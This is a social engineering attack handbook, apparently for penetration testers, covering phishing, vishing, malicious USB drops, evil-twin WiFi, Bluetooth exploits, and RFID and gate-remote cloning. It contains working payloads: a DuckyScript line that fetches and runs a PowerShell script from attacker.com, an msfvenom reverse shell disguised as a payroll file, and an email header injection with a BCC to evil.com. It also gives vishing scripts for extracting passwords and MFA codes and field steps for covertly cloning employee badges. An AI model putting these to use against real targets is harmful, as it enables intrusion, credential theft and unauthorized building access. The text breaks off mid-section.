# Social Engineering Handbook
**Author:** Security Research Team
**Date:** 2026-03-08
**Status:** v1 COMPLETE — tools + commands + automated scanner integration documented
**Companion to:** `00_meta/specs/se_module_spec.md`, pentest playbook

---

> **LEGAL WARNING**
> Every technique in this handbook requires explicit written authorization from the target organization before use. Unauthorized use constitutes a criminal offence in all major jurisdictions. This document exists for authorized security testing and defensive awareness only — to help organizations recognize, test, and defend against these attacks.
> UK: Computer Misuse Act 1990. AUS: Criminal Code Act 1995 Part 10.7. US: CFAA 18 U.S.C. § 1030.

---

## Approach

Same as the pentest playbook: identify every vector, exhaust every possibility for each one. Document everything. Endorse nothing.

Success is not a click rate or a submission percentage. Success is exhausting every angle until something gives — because eventually something always does. A person under enough pretext pressure, receiving a convincing enough lure, from a trusted enough source, will slip. The question is not if — it is which vector, which pretext, and how long it takes.

The handbook documents all of them.

---

## Structure

### 1. Phishing & Email
### 2. Vishing (Voice)
### 3. Platform Spoofing
### 4. Physical Vector — Removable Media
### 5. Public WiFi & Network Sniffing
### 6. Bluetooth
### 7. RFID, Sub-GHz & Physical Access
### 8. Pretexting & Impersonation
### 9. OSINT as the Foundation
### 10. Advanced Persistent SE — Multi-Stage Physical + Digital Chains
### 11. Legal & Authorization
### 12. Defensive Checklist
### 13. Campaign Chains — Full-Scope Engagement Sequences

---

## 1. Phishing & Email

### 1.1 What it is
Email-based deception. Lure the target to a malicious URL, fake login page, or malicious attachment. Goal: credential theft, malware delivery, account takeover.

### 1.2 Vectors

**Spoofed sender**
- From header forged to appear as trusted party (IT, bank, HMRC, internal colleague)
- SPF/DKIM/DMARC misconfiguration on target domain enables spoofing
- Automated scanning checks target domain for email auth misconfigs

**Lure URL — open redirect**
- Target domain has `/login?next=https://attacker.com` — URL looks legitimate, redirects to attacker
- Automated scanning discovers open redirects; reconnaissance output contains a phishing lure template
- Defense: validate redirect parameters server-side, whitelist allowed destinations

**Credential harvesting page**
- Fake login page mirroring target's actual UI
- URL: typosquat domain, subdomain (login.target-security.com), or lure via open redirect on real domain
- Goal: user enters real credentials, attacker captures them
- Automated phishing delivery (v2): deploys harvester, sends lure, captures submission

**Email header injection**
- Contact/support forms that don't sanitize input
- Attacker injects CC/BCC headers via form fields → sends phishing from target's own mail server
- Automated scanning detects email header injection points (email injection class finding)

**Malicious attachment**
- PDF, Office doc, ZIP with payload
- Macro-enabled Office docs — classic delivery for RAT/ransomware droppers
- PDFs with embedded JavaScript or URI handlers
- Defense: disable macros by default, sandbox attachments, email filtering

### 1.3 Recognize it
- Check From header vs Reply-To — mismatch is a red flag
- Hover links before clicking — destination URL vs displayed text
- Sense of urgency is manufactured pressure — slow down
- Unexpected attachments from known senders — verify via separate channel
- Check email headers for SPF/DKIM fail indicators

### 1.5 Tools

**GoPhish** — open-source phishing framework (most widely used in authorized engagements)
- Install: `apt install gophish` or `go install github.com/gophish/gophish@latest`
- Run: `./gophish` → admin UI at https://127.0.0.1:3333 (admin / gophish default — change immediately)
- Setup flow: Sending Profile → Email Template → Landing Page → User Groups → Campaign
- Landing pages: clone real login page with built-in site importer or write HTML manually
- Tracking: each email has unique tracking pixel + unique credential submission URL
- Results: GoPhish dashboard shows opens, clicks, credential submissions in real time
- Use the phishing lure template from OSINT reconnaissance output (open redirect URL, spoofed domain) in your campaign landing page URL

**SET (Social Engineering Toolkit)** — comprehensive SE framework (Kali built-in)
- Run: `sudo setoolkit` → interactive menu
- Spear phishing: 1 (Social-Engineering Attacks) → 1 (Spear-Phishing Attack Vectors)
- Credential harvester: 2 (Website Attack Vectors) → 3 (Credential Harvester Attack Method)
  - Clone site: option 2 (Site Cloner) → enter URL to clone → SET serves on :80
  - Submit to: SET captures any form POST to the local listener
- Mass email: SET → 1 → 4 (Create a Payload and Listener) for attachment delivery
- SET is on Kali by default: `which setoolkit` confirms

**Evilginx2** — reverse proxy phishing (captures session tokens, bypasses MFA)
- GitHub: `github.com/kgretzky/evilginx2`
- Build: `go build -o evilginx main.go`
- How it works: sits between user and real login page as reverse proxy — captures session cookies, not just passwords
- Setup: `phishlets hostname <service> <your-domain>` → `phishlets enable <service>` → `lures create <service>`
- Advantage over GoPhish: captures active session tokens → bypasses TOTP/HOTP MFA
- Requires: a domain you control + valid TLS cert (Let's Encrypt) pointing at your server
- Legitimate use: proving MFA bypass risk to client in authorized engagement

**Email header injection test (manual)**
```bash
# Test /contact endpoint for CRLF injection
curl -X POST https://target.com/contact \
  -d "name=Test%0AX-Injected:+probe&email=test@test.com&message=test"
# Check: does response contain X-Injected or fail to strip \n?

# More thorough: inject BCC header
curl -X POST https://target.com/contact \
  -d "name=Test&email=test@test.com%0ABcc:+attacker@evil.com&message=test"
# If 200 and email is sent to BCC address: email injection confirmed
```

**SPF/DKIM/DMARC check (before spoofing attempt)**
```bash
# Check SPF
dig TXT target.com | grep "v=spf1"
# "v=spf1 include:... ~all" — softfail (spoof may get through)
# "-all" — hardfail (spoof likely blocked)
# No record — no SPF (high spoofability)

# Check DMARC
dig TXT _dmarc.target.com
# "p=none" — DMARC monitoring only (spoof may get through)
# "p=quarantine" or "p=reject" — spoof will be blocked/quarantined

# Check DKIM selector (common: default, mail, google, k1)
dig TXT default._domainkey.target.com
dig TXT mail._domainkey.target.com
```

**Open redirect test (manual)**
```bash
# Test ?next= parameter
curl -s -I "https://target.com/login?next=https://evil.com" | grep -i location
# If Location: https://evil.com → open redirect confirmed
```

---

## 2. Vishing (Voice)

### 2.1 What it is
Phone-based deception. Caller impersonates trusted authority (IT support, bank, government, vendor) to extract credentials, MFA codes, or sensitive information verbally.

### 2.2 Vectors

**IT support pretext**
- "Hi, I'm calling from IT — we've detected suspicious activity on your account and need to verify your credentials"
- Target reads back password or MFA code over the phone
- Most effective when caller knows target's name, department, manager (from OSINT)

**Bank / payment fraud pretext**
- "This is your bank's fraud team — we're seeing unusual transactions. I need to verify your online banking password"
- Creates urgency + authority combination

**Government / HMRC / ATO pretext**
- "This is HMRC. You have an outstanding debt. Provide payment details now or face arrest"
- Fear-based. Particularly effective on non-technical targets.

**Vendor / supplier pretext**
- "I'm calling from [vendor they use]. We're updating API credentials. Can you confirm your current key?"
- Effective when caller knows which vendors the target uses (from OSINT, job listings, LinkedIn)

### 2.3 What automation proves
- Call connects to target number
- Script delivers correctly
- What it cannot prove: whether target surrenders creds — human variable, not measurable by tool

### 2.3 Tools

**Twilio (programmatic call delivery)**
```python
# pip install twilio
from twilio.rest import Client

client = Client("ACCOUNT_SID", "AUTH_TOKEN")

# Send recorded message:
call = client.calls.create(
    url="https://yourdomain.com/vishing_script.xml",  # TwiML XML
    to="+61400000000",   # target number
    from_="+1234567890"  # your Twilio number
)
print(f"Call SID: {call.sid}, Status: {call.status}")

# TwiML script (vishing_script.xml):
# <Response>
#   <Say voice="man">Hi, this is IT support calling from Target Corp.
#   We've detected suspicious activity on your account.
#   Please call back on extension 4422 to verify your credentials.</Say>
# </Response>
```

**Caller ID spoofing**
- Concept: SIP INVITE with forged From: header — legal only in authorized security testing
- Tools: Asterisk + SIP trunking provider that allows CLI override
- Twilio: does NOT allow caller ID spoofing — use only your verified numbers
- Note: spoofing your client's own internal number is particularly effective as a pretext tool
- Legal: authorized SE testing only. UK Fraud Act 2006, AUS Criminal Code — spoofing for deception = criminal

**Manual vishing script framework**
```
Call structure:
1. Opening: "<Name>? Hi, I'm [role] from [department]. I'm calling about [urgent issue]."
2. Authority establishment: "We've been alerted by [senior person name] to reach out directly."
3. Problem statement: "There's been [security incident / unusual activity / compliance issue]."
4. Request: "I need to verify your [credentials / access code / MFA token] to [protect your account / fix the issue]."
5. Close: "Once confirmed I'll get this resolved straight away. You won't need to do anything else."

Pressure techniques (use sparingly — too much breaks the pretext):
- Time: "We need to resolve this before end of business today"
- Authority: "Your manager [name from LinkedIn] has already been notified"
- Fear: "Your account will be locked if we can't verify in the next hour"
```

### 2.4 Automated vishing delivery (v2)
Automated OSINT compiles pretext hooks and vishing targets by role from reconnaissance output. Highest-value target is selected by role. Script is built from pretext hooks. Call is delivered via Twilio. Call connection confirmed. Finding: MEDIUM — delivery proven.

### 2.5 Recognize it
- Unexpected call requesting credentials — legitimate IT/banks never ask for passwords over the phone
- Caller creating urgency or fear — manufactured pressure
- Caller knows your name/details — OSINT doesn't mean the caller is legitimate
- Verify by hanging up and calling the organization directly on a known number

---

## 3. Platform Spoofing

### 3.1 What it is
Impersonation of legitimate platforms (Discord, Steam, Microsoft, Google, etc.) to steal credentials or account access.

### 3.2 Vectors

**Prize/gift scam (Discord, Steam)**
- "You've won a free game / Nitro subscription — log in to claim"
- Fake OAuth flow or fake login page mimicking Discord/Steam
- Target enters real credentials → account stolen
- Same principle as phishing — different platform, same mechanism

**Fake OAuth flow**
- "Log in with Google to claim your reward"
- Fake OAuth page captures credentials or authorization tokens
- Technically: attacker hosts page that mimics Google OAuth UI
- Defense: check URL bar — OAuth from Google should be accounts.google.com

**ARP spoofing / network-level spoofing**
- On local network: ARP cache poisoning redirects traffic through attacker
- Target visits legitimate site, attacker intercepts credentials in transit
- Requires local network access — not remote
- Defense: HTTPS everywhere (HSTS), network monitoring, certificate pinning

**SMS phishing (Smishing)**
- Same as email phishing but via SMS
- Links appear in messages from spoofed numbers
- Defense: don't click links in unexpected SMS messages

### 3.3 Recognize it
- URL is wrong — Discord is discordapp.com or discord.com, not discord-gifts.com
- Unexpected prize notifications — if you didn't enter a competition, you didn't win
- OAuth page URL must match the real platform's domain exactly

---

## 4. Physical Vector — Removable Media

### 4.1 What it is
Planting malicious media (USB, optical disc) in or near target premises. Target plugs it in or inserts it — payload executes.

### 4.2 Vectors

**USB drop**
- Leave labelled USB drives near target premises ("Payroll Q1 2026", "Staff Survey")
- Human curiosity drives insertion
- BadUSB: USB device emulates keyboard, types commands automatically on insertion — no autorun needed, no user interaction beyond plugging in
- Standard payload USB: requires autorun (disabled by default on modern Windows) or relies on user opening files manually
- Payload options: keylogger, RAT, ransomware dropper, reverse shell, credential dumper

**Optical media (CD/DVD)**
- Mix CDs, "free software" discs left in common areas
- Autorun on insert (increasingly disabled) or user opens manually
- Less effective on modern systems but still viable for legacy environments
- Same payload options as USB

**Charging cable / accessory**
- O.MG Cable and equivalents: USB cable with embedded microcontroller
- Looks like a standard charging cable, acts as BadUSB when connected
- Particularly effective: target borrows cable, plugs into laptop

### 4.3 Payload types

| Payload | What it does | Detection |
|---------|-------------|-----------|
| Keylogger | Records all keystrokes, exfiltrates to attacker | AV, EDR, network monitoring |
| RAT (Remote Access Trojan) | Full remote control of system | AV, EDR, unusual outbound connections |
| Ransomware dropper | Encrypts files, demands payment | AV, EDR, backup monitoring |
| Reverse shell | Command line access to target machine | Firewall, EDR, outbound connection monitoring |
| Credential dumper | Extracts saved passwords from browser/OS | AV, EDR |
| BadUSB script | Executes typed commands instantly on insertion | Physical security — don't plug in unknown devices |

### 4.3 Tools

**USB Rubber Ducky (Hak5)**
- Site: hak5.org/products/usb-rubber-ducky
- What it does: emulates a USB HID keyboard — types a payload script at machine speed on insertion
- No autorun needed — the OS treats it as a keyboard, not storage
- DuckyScript payload example (drops reverse shell):
```
DELAY 2000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
ENTER
```
- Real-world pretext: disguised as a company-branded USB drive left in carpark or common area
- Detection: USB device control via MDM/GPO blocks unrecognized USB HID devices

**O.MG Cable**
- Site: o.mg.lol
- What it does: USB-A or USB-C cable with embedded microcontroller + WiFi module
- Appears completely normal — charging cable, data cable, or USB-A to Lightning
- Capabilities: BadUSB (types scripts), keylogging, over-the-air payload delivery via WiFi
- WiFi exfiltration: attacker connects to cable's AP from outside the building
- Pretext: "borrowed" cable, "left behind" charger, gift, shared charging station
- Cost: ~$180-250 USD (commercial red team tool)
- Detection: only via physical inspection of cable internals (cut it open) or USB device control blocking keyboard emulation from charging devices

**USB keylogger (hardware)**
- Types: USB inline (between keyboard and PC port), compact (looks like USB drive, plugs into keyboard port)
- Examples: KeyGrabber series — stores to internal memory, downloads via USB mass storage
- WiFi variants: KeyGrabber WiFi — sends keystrokes to remote endpoint, no retrieval needed
- Detection: physical inspection — small device between keyboard and port. EDR cannot detect — hardware, no software component

**Payload delivery (Metasploit integration)**
```bash
# Generate payload for USB drop:
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
  -f exe -o payload.exe

# Disguise as legitimate file:
# Rename to: IT_Security_Update_2026.exe, Payroll_Q1.exe
# Drop in labelled USB with decoy documents

# Start listener:
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST attacker.com; set LPORT 443; run"
```

### 4.4 Recognize / defend against it
- Policy: never plug in unknown USB devices — mandatory staff training
- Technical: USB device control via MDM/GPO (whitelist allowed devices)
- Physical: secure premises — if an attacker can drop USBs inside, perimeter is already breached
- Disable autorun on all endpoints (Group Policy: `NoDriveTypeAutoRun`)
- Monitor for new USB device insertions via EDR

---

## 5. Public WiFi & Network Sniffing

### 5.1 What it is

The target connects to public WiFi (cafe, airport, hotel, coworking space). The attacker is on the same network — passively capturing traffic, injecting content, or running an evil twin AP that the target connects to instead of the real network. One of the highest-probability physical SE vectors because it requires no social interaction and the attack surface is enormous.

Direct Pi Zero deployment match: Pi Zero 2W has onboard WiFi. An automated web scanner targeting the same application the attacker has physical proximity to combines network capture + app-level vulnerability discovery in a single operation.

### 5.2 Vectors

**Passive capture on shared network**
- Target connects to legitimate cafe WiFi, attacker is also connected
- Any unencrypted HTTP traffic (increasingly rare but exists) captured in full — credentials, session tokens, form data
- DNS queries reveal browsing activity even when content is encrypted
- ARP traffic reveals device MAC addresses and local IPs

**Evil twin AP (rogue access point)**
- Attacker creates AP with identical or similar SSID to legitimate network
- Devices may auto-connect (saved network) or target manually connects
- All traffic flows through attacker's device — full MITM capability
- Most powerful when combined with deauth attack: knock devices off legitimate network, let them reconnect to evil twin

**Deauth + captive portal**
- Deauth attack (802.11 management frame injection) disconnects target from legitimate AP
- Target reconnects to attacker's AP with identical SSID
- Captive portal presented: "Please re-enter WiFi password to continue" or "Session expired — log in again"
- Target enters corporate credentials into attacker-controlled form

**SSL stripping (diminishing but not dead)**
- HTTPS Everywhere and HSTS make this harder on modern targets
- Still viable on: HTTP-only pages, sites without HSTS preloading, non-HTTPS redirects
- Attacker downgrades HTTPS to HTTP in transit — credentials sent in plaintext
- Defense: HSTS preloading, always-on HTTPS, no HTTP fallback

### 5.3 Tools

**Aircrack-ng suite** — WiFi monitoring, capture, cracking (Kali built-in)
```bash
# Set WiFi adapter to monitor mode:
airmon-ng start wlan0
# wlan0mon is now in monitor mode

# Capture all traffic in range:
airodump-ng wlan0mon
# Shows: BSSID, channel, SSID, clients, traffic

# Target a specific network (capture to file):
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/capture wlan0mon
# -c: channel, --bssid: target AP MAC, -w: output file prefix

# Deauth attack (disconnect clients from target AP):
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0: deauth, 5: number of deauth frames, -a: target AP BSSID
# Use -c to target a specific client: -0 5 -a <AP_BSSID> -c <CLIENT_MAC>
```

**hostapd-wpe** — evil twin AP with WPA Enterprise credential capture
```bash
# Create rogue AP matching target SSID:
# Edit /etc/hostapd-wpe/hostapd-wpe.conf:
#   interface=wlan0
#   ssid=CoffeShop_Free_WiFi
#   channel=6

hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captures WPA Enterprise credentials (MSCHAPv2) in plaintext-equivalent format
# Particularly effective against corporate targets using 802.1X authentication
```

**bettercap** — network MITM framework (modern aircrack alternative)
```bash
# Install: apt install bettercap
bettercap -iface wlan0

# In bettercap shell:
> wifi.recon on              # scan for networks
> wifi.deauth AA:BB:CC:DD:EE:FF  # deauth specific AP
> set wifi.ap.ssid "CafeWifi"    # create AP with target SSID
> wifi.ap on                # start evil twin

# ARP spoofing on wired/WiFi network (MITM existing connections):
> set arp.spoof.targets 192.168.1.50  # target IP
> arp.spoof on
> net.sniff on              # capture traffic
```

**Wireshark / tcpdump** — packet analysis
```bash
# Capture live on interface:
tcpdump -i wlan0mon -w /tmp/capture.pcap

# Filter for credentials in HTTP traffic:
tcpdump -i wlan0mon -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Open in Wireshark for analysis:
wireshark /tmp/capture.pcap &
# Filter: http.request.method == "POST" — shows form submissions
# Filter: http contains "password" — direct credential search
```

**dnschef** — fake DNS server (redirect domains to attacker IP)
```bash
# pip3 install dnschef
dnschef --interface 192.168.1.1 --fakeip 192.168.1.100 --fakedomains target.com
# All DNS queries for target.com resolve to attacker's IP
# Combine with captive portal or credential harvester on :80/:443
```

**Pi Zero 2W deployment**
```bash
# Pi Zero as a drop device / evil twin:
# Hardware: Pi Zero 2W + USB WiFi adapter (internal for client, USB for AP)
# or: Pi Zero 2W with single adapter (monitor mode + AP mode simultaneously on some chipsets)

# Recommended dual-adapter setup:
# wlan0 (onboard): connect to internet for relay (optional)
# wlan1 (USB): monitor mode + evil twin AP

# Install on Pi Zero:
apt install hostapd dnsmasq bettercap

# Run evil twin automatically on boot via systemd service:
# Lightweight enough for Pi Zero RAM (hostapd ~15MB, dnsmasq ~5MB)
```

### 5.4 Automated scanner integration

Public WiFi capture + automated web scanning creates a combined operation:
1. Target connects to evil twin or legitimate shared network
2. Attacker captures target's session cookie for web application (if HTTP or via SSLstrip)
3. Automated web scanner runs against same application with captured session — skips credential testing, goes direct to authenticated scan chains
4. Result: full authenticated vulnerability scan using target's own session — no credentials needed

```bash
# Capture target session cookie from HTTP traffic:
# In Wireshark: filter "http.cookie" — extracts session value

# Inject captured session cookie into your scanner's authenticated scan profile
# Most web scanners support cookie injection via config or environment variable
```

### 5.5 Recognize / defend against it

- **Never use public WiFi for sensitive work** without a VPN — full stop
- **VPN always-on** on corporate devices (split tunnelling off for corporate traffic)
- **HSTS preloading** on all web properties — blocks SSL stripping
- **WPA3** on corporate networks — protects against offline dictionary attacks on captured handshakes
- **Certificate pinning** in mobile apps — prevents evil twin MITM even with trusted cert
- **802.1X** (enterprise WiFi auth) with EAP-TLS (certificate-based, not password-based) — eliminates credential capture via evil twin
- **User training**: only connect to known networks, verify SSID via staff, use mobile data for sensitive tasks in public

---

## 6. Bluetooth

### 6.1 What it is

Bluetooth and Bluetooth Low Energy (BLE) attacks targeting mobile devices, laptops, IoT devices, and accessories. Unlike WiFi, Bluetooth attacks can be executed silently at close range (~10m for Class 2 devices, up to ~30m with directional antenna in ideal conditions) without any network infrastructure. The target has no indication they've been attacked.

### 6.2 Vectors

**Passive BLE sniffing**
- BLE devices (fitness trackers, smart locks, medical devices, AirTags, keyboards) broadcast advertising packets continuously
- Passive capture reveals: device type, manufacturer, firmware version, usage patterns, physical location tracking
- No interaction required — purely passive, undetectable

**BlueBorne (CVE-2017-0781 et al.)**
- Critical class of vulnerabilities in Bluetooth stack (Linux, Android, Windows, iOS)
- Remote code execution over Bluetooth without pairing, without target interaction
- Patched in 2017 but unpatched devices remain common (IoT, legacy Android, embedded)
- Attack: send malformed L2CAP packets → overflow Bluetooth stack → arbitrary code execution
- Range: ~10 metres standard Bluetooth

**Bluebugging**
- Exploits AT command interface exposed over Bluetooth in older headsets and phones
- Attacker issues AT commands: read SMS, make calls, intercept calls, access phonebook
- Primarily affects older feature phones and legacy Bluetooth headsets — increasingly rare on modern devices

**BLE MITM (keyless entry, smart locks)**
- Many BLE-enabled locks and keyless entry systems have weak or no encryption
- Attacker captures BLE unlock sequence → replay attack opens lock
- Particularly relevant to: smart office entry systems, hotel room locks, vehicle keyless entry

**Bluetooth keyboard sniffing**
- Unencrypted Bluetooth keyboards (common in budget/older models) transmit keystrokes in plaintext
- Ubertooth One passively captures all Bluetooth traffic in range → extract keystrokes
- Enterprise risk: executive typing passwords on Bluetooth keyboard at desk, attacker in lobby or adjacent office

### 6.3 Tools

**Ubertooth One** — open-source Bluetooth sniffer hardware (~$120)
```bash
# Install tools:
apt install ubertooth

# Passive capture of all Bluetooth traffic in range:
ubertooth-btle -f -c /tmp/ble_capture.pcap
# -f: follow connections, -c: capture file

# Sniff a specific BLE device (by MAC):
ubertooth-btle -t AA:BB:CC:DD:EE:FF -c /tmp/target_ble.pcap

# Classic Bluetooth (BR/EDR) capture:
ubertooth-rx -c /tmp/classic_bt.pcap

# Analyse with Wireshark:
wireshark /tmp/ble_capture.pcap
# Filter: btle.advertising_header — advertising packets (device discovery)
# Filter: btatt — BLE attribute protocol (data transfer)
```

**BlueZ + gatttool** — built-in Linux BLE tools (no extra hardware needed)
```bash
# Scan for BLE devices:
hciconfig hci0 up
hcitool lescan
# Output: AA:BB:CC:DD:EE:FF  DeviceName

# Connect to BLE device and enumerate services/characteristics:
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary         # list services
> characteristics # list characteristics (data endpoints)
> char-read-hnd 0x002a  # read characteristic at handle 0x002a

# Write to characteristic (if writable — e.g. BLE smart lock):
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0025 -n 01  # send unlock command
```

**btlejack** — BLE traffic sniffing and MITM (requires BBC micro:bit or Ubertooth)
```bash
# pip3 install btlejack
btlejack -s           # scan for BLE connections in range
btlejack -c AA:BB:CC:DD:EE:FF  # follow specific connection
# Captures BLE connection data — decrypts if keys are known
```

**Bluetooth keyboard sniffer (KeySweeper clone)**
- KeySweeper: Arduino-based device disguised as USB charger, sniffs Microsoft wireless keyboards
- Open-source: github.com/samyk/keysweeper
- Logs keystrokes to memory card or sends via SMS (with SIM module)
- Detection: physical inspection only — looks like a standard USB charger

**bettercap BLE commands**
```bash
bettercap -iface hci0

# In bettercap shell:
> ble.recon on      # scan for BLE devices
> ble.show          # list discovered devices
> ble.enum AA:BB:CC:DD:EE:FF  # enumerate services/characteristics on device
```

**BlueBorne exploit framework**
```bash
# github.com/ArmisSecurity/blueborne
# Python PoC for CVE-2017-0781 (Android) and CVE-2017-0782
# Requires: unpatched Android target with Bluetooth enabled

python3 exploit.py AA:BB:CC:DD:EE:FF
# Sends malformed L2CAP packets — RCE on vulnerable target
# Patched in Android 2017, iOS 2017, Windows 2017 — test only on explicitly authorized unpatched devices
```

### 6.4 Pi Zero 2W deployment

```bash
# Pi Zero 2W: no onboard Bluetooth in Pi Zero 2W (has WiFi, not BT)
# Add BT capability: USB Bluetooth 5.0 dongle (~$8)
# Or: use Raspberry Pi 3B/4 (has onboard BT)

# For BLE sniffing on Pi Zero:
# USB BLE dongle + BlueZ:
apt install bluetooth bluez

# Run continuous BLE scan + log to file:
hciconfig hci0 up
hcitool lescan --duplicates | tee /tmp/ble_scan.log

# For full capture: Ubertooth plugged into Pi Zero USB hub
# Ubertooth power draw: ~200mA — within Pi Zero USB spec
```

### 6.5 Recognize / defend against it

- **Turn Bluetooth off when not in use** — eliminates the passive advertising attack surface entirely
- **Patch immediately** — BlueBorne class vulns are years old; unpatched devices in enterprise are a risk
- **Encrypted Bluetooth keyboards** — buy keyboards that support Bluetooth encryption (most modern Bluetooth HID devices encrypt; verify before purchasing for executive use)
- **BLE smart locks** — audit before deploying; many consumer-grade BLE locks have replay vulnerabilities. Use locks that implement rolling codes or mutual authentication
- **Enterprise WiFi/BT policy** — prohibit personal Bluetooth accessories on corporate networks; MDM can enforce Bluetooth-off policy
- **Physical proximity** awareness — Bluetooth attacks require ~10m range; an attacker needs to be present

---

## 7. RFID, Sub-GHz & Physical Access

### 7.1 What it is

Radio-based attacks targeting physical access control systems. RFID and NFC badge cloning gives an attacker a copy of a target employee's building access credential. Sub-GHz radio attacks target gate controllers, garage doors, car key fobs, and wireless alarm systems — capturing and replaying the signal that opens them.

These vectors are significant because they bypass the digital perimeter entirely. No phishing email. No exploit. A cloned badge walks through the front door.

### 7.2 RFID / NFC badge cloning

**How access control RFID works:**
- Most corporate badge systems use 125kHz LF RFID (EM4100, HID Prox, Indala) or 13.56MHz HF (MIFARE Classic, DESFire, NTAG)
- Reader powers the card passively via electromagnetic field
- Card broadcasts its ID (fixed code) — reader validates against an access control database
- Weakness: most legacy 125kHz systems broadcast the card ID with no encryption and no mutual authentication — read it once and you have everything you need to clone it

**Attack surface:**
- Any employee who walks within 5-10cm of an attacker's concealed reader has their badge cloned
- "Shoulder surfing" variant: attacker holds phone-sized reader near target's bag/pocket/wallet
- Corporate lanyards worn visibly → easy target orientation
- Hotel key cards, gym fobs, transport cards — same attack surface

**MIFARE Classic (13.56MHz) weakness:**
- MIFARE Classic uses a proprietary cipher (Crypto-1) broken in 2008
- Many older installations still use it
- Attack: capture authentication handshake → offline brute force → clone card with valid key
- MIFARE DESFire (AES-128) is significantly more resistant — check which version the target uses before assuming clone is possible

### 7.3 Sub-GHz RF (gate remotes, car keys, garage doors)

**Fixed code systems (easy):**
- Older gate controllers, garage door openers, alarm key fobs use fixed codes
- Attacker captures signal once (on one button press) → replays it → opens gate
- Common frequencies: 433.92MHz, 315MHz, 868MHz (EU)
- Many cheap consumer remotes (including residential gates, barriers) still use fixed codes

**Rolling code systems (harder):**
- Modern car key fobs and many gate systems use rolling codes (KeeLoq algorithm)
- Each button press generates a different code — captured replay doesn't work
- Attack variants:
  - **Rolljam (Samy Kamkar, 2015)**: jam the signal so the car doesn't respond, capture the code. Target presses again (thinks first press failed), attacker captures second code while replaying first one. Attacker now holds one valid unused code. Works against KeeLoq.
  - **Capture + offline cryptanalysis**: KeeLoq has known weaknesses — requires significant effort but possible
- Most residential gates still use fixed codes — rolling code primarily found in automotive

**Wireless alarm systems:**
- Many older wireless PIR sensors, door contacts, and alarm panels use unencrypted 433MHz signals
- Capture the signal that disarms the alarm → replay to disarm
- Limitation: requires capture of legitimate disarm event first

### 7.4 Flipper Zero

The Flipper Zero is the primary tool for this attack surface. A purpose-built open-source multi-tool for physical security testing. Fits in a pocket, looks like a toy, contains:
- **Sub-GHz radio** (300-928MHz): read, save, replay any sub-GHz remote signal
- **RFID 125kHz** (LF): read and emulate EM4100, HID Prox, Indala, IO Prox, and more
- **NFC 13.56MHz** (HF): read and write MIFARE Classic (with key), NTAG, EMV partial read
- **Infrared**: read and replay any IR remote
- **iButton/Dallas**: read and emulate iButton keys
- **BadUSB**: USB HID injection (same as Rubber Ducky)
- **Bluetooth**: BLE scanning and some device interaction
- **GPIO**: external hardware extension

**Cost:** ~$170 USD. Available at flipperzero.one.

```
# Flipper Zero operations (device UI — no commands, all menu-driven):

# RFID 125kHz clone:
# Applications → RFID → Read → (hold Flipper near badge) → Save → Write
# Saved card stored on SD card, emulate with:
# RFID → Saved → [card name] → Emulate
# Hold Flipper near reader — acts as cloned badge

# Sub-GHz capture + replay:
# Applications → Sub-GHz → Read RAW → (press button on target remote) → Save
# Sub-GHz → Saved → [recording] → Send → [opens gate]

# MIFARE Classic read (if default/known keys):
# NFC → Read → (hold near card) → Save
# If key negotiation fails: NFC → Saved → [card] → [check for mfkey32 attack]

# BadUSB (keystroke injection):
# Applications → Bad USB → [load .txt payload from SD card] → Run
# Payloads in DuckyScript format — same syntax as Rubber Ducky
```

**Flipper Zero Unleashed firmware** (community, extends capabilities):
- Additional Sub-GHz frequencies and protocols
- More RFID protocols
- Install: flash via qFlipper desktop app
- GitHub: github.com/DarkFlippers/unleashed-firmware

**Flipper Zero vs Pi Zero 2W:**
- Flipper Zero: physical layer attacks — RFID, RF remotes, NFC, BadUSB, IR. Standalone, no computer needed, pocket-sized.
- Pi Zero 2W: network/web layer attacks — WiFi evil twin, passive packet capture, web application testing. Runs Linux, requires power bank.
- They operate at different levels and complement each other. Together they cover physical + network + web in a single operation.

### 7.5 Extended hardware

**Proxmark3** — professional RFID research tool (~$300)
```bash
# More capable than Flipper for RFID — supports all protocols, sniffing, fuzzing
# Install client: apt install proxmark3

# Read 125kHz card:
pm3 --cmd "lf search"

# Clone 125kHz card to blank T5577:
pm3 --cmd "lf em 410x clone --id AABBCCDDEE"

# MIFARE Classic full attack (nested + hardnested):
pm3 --cmd "hf mf autopwn"
# Recovers all 32 keys, reads full card, saves to file
# Works on most MIFARE Classic 1K/4K installations

# Write cloned MIFARE to blank card:
pm3 --cmd "hf mf restore --1k"
```

**RTL-SDR** — USB software-defined radio dongle (~$25)
```bash
# Passive sub-GHz monitoring (listen only, no transmit):
apt install rtl-sdr gqrx-sdr

# GUI spectrum analysis:
gqrx  # set frequency to 433.92MHz, look for signal when button pressed

# Record and replay (with TX-capable SDR like HackRF):
# Record: rtl_sdr -f 433920000 -s 250000 capture.iq
# Replay requires HackRF or similar TX-capable hardware
```

**HackRF One** — transmit/receive SDR (~$340)
```bash
# Full sub-GHz capability: record and replay
hackrf_transfer -r capture.iq -f 433920000 -s 2000000  # record
hackrf_transfer -t capture.iq -f 433920000 -s 2000000  # transmit (replay)
# ~10m range standard antenna
```

### 7.6 Operational technique

**Badge cloning in the field:**
1. Identify target — employee with visible badge/lanyard, particularly someone with admin/IT/physical security access
2. Concealment: Flipper Zero or Proxmark3 in pocket or bag — antenna range is 5-10cm for LF, ~3cm for HF
3. Opportunity: elevator, coffee queue, turnstile tailgate — any moment of close physical proximity
4. Read: Flipper passive read mode — no button press needed, reads automatically when card enters range
5. Clone: write to blank RFID fob or emulate directly from Flipper
6. Test: present cloned credential at a low-security reader first (car park, secondary door) before attempting primary access

**Gate remote in the field:**
1. Identify target access point — car park barrier, service gate, loading dock
2. Observe legitimate access — wait for employee to use remote
3. Capture: Flipper Sub-GHz in Read RAW mode — records signal on button press
4. Test: if fixed code, replay opens gate. If rolling code, requires Rolljam technique.

### 7.7 Recognize / defend against it

**RFID:**
